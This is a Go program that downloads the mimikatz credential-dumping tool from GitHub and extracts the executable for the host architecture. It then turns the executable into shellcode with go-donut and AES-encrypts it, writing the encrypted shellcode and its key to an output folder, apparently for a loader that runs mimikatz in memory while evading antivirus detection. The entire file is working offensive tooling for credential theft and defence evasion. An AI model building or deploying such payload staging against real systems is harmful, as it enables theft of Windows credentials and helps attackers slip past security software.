package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path"
	"runtime"

	"github.com/Binject/go-donut/donut"
)

const mimikatzURL = `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip`

var (
	exePrefix  string
	outputPath string
)

func checkErr(err error) {
	if err != nil {
		log.Panicf("Unexpected error encountered: %s", err)
	}
}

func setExePrefix(exePrefix *string) {
	switch runtime.GOARCH {
	case "amd64":
		*exePrefix = "x64"
	case "386":
		*exePrefix = "Win32"
	default:
		fmt.Println("This architecture is not compatible with mimikatz.exe")
		os.Exit(1)
	}
}

func downloadBinary() ([]byte, error) {
	var binary []byte

	resp, err := http.Get(mimikatzURL)
	checkErr(err)
	defer resp.Body.Close()

	zipFile, err := io.ReadAll(resp.Body)
	checkErr(err)
	zipReader, err := zip.NewReader(bytes.NewReader(zipFile), int64(len(zipFile)))
	checkErr(err)

	for _, file := range zipReader.File {
		if path.Join(exePrefix, "mimikatz.exe") != file.Name {
			continue
		}
		fileHandle, err := file.Open()
		checkErr(err)
		defer fileHandle.Close()
		binary, err = io.ReadAll(fileHandle)
		checkErr(err)
		break
	}

	return binary, err
}

func encryptAES(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	checkErr(err)

	ciphertext := make([]byte, aes.BlockSize+len(data))
	iv := ciphertext[:aes.BlockSize]
	_, err = io.ReadFull(rand.Reader, iv)
	checkErr(err)

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], data)

	return ciphertext, nil
}

func init() {
	setExePrefix(&exePrefix)
	flag.StringVar(&outputPath, "o", "", "Path to place the pads for AES encryption")
	flag.Parse()
	if len(outputPath) < 1 {
		flag.Usage()
		os.Exit(0)
	}
}

func main() {
	binary, err := downloadBinary()
	checkErr(err)

	sc, err := donut.ShellcodeFromBytes(bytes.NewBuffer(binary), donut.DefaultConfig())
	checkErr(err)

	key := make([]byte, 32)
	_, err = rand.Read(key)
	checkErr(err)

	encrypted_sc, err := encryptAES(sc.Bytes(), key)
	checkErr(err)

	checkErr(os.WriteFile(path.Join(outputPath, "encrypted_sc"), encrypted_sc, 0777))
	checkErr(os.WriteFile(path.Join(outputPath, "key"), key, 0777))
}
